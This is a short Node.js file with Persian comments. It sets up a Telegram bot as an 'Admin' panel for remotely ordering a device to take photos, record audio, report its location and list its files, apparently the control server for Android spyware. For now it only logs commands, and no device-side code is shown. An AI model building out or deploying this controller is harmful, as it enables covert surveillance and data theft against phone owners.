const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const port = 3000;

// توکن رباتت رو اینجا مستقیم بنویس
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let devices = {}; // اینجا وضعیت دستگاه‌ها و دستورهای فعال رو نگه میداریم

// وقتی /start زدی
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📷 Take Photo", callback_data: "photo" }],
        [{ text: "🎤 Record Audio", callback_data: "audio" }],
        [{ text: "📍 Get Location", callback_data: "location" }],
        [{ text: "📂 List Files", callback_data: "files" }]
      ]
    },
    parse_mode: "HTML"
  };

  bot.sendMessage(chatId, "👋 <b>Welcome Admin!</b>\nSelect an action:", keyboard);
});

// وقتی روی دکمه‌ها کلیک می‌کنی
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const action = query.data;
  
  bot.answerCallbackQuery(query.id); // حذف لودینگ دکمه
  
  console.log(`Admin requested: ${action}`);
  
  // اینجا یه پیام به خودت نشون میدیم که فهمیدیم کلیک کردی
  bot.sendMessage(chatId, `✅ Command <b>${action}</b> sent to device.`);
  
  // نکته مهم: 
  // در آینده اینجا کدی مینویسیم که به اندروید بگه "حالا دوربینت رو روشن کن!"
  // فعلا فقط لاگ میکنیم
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
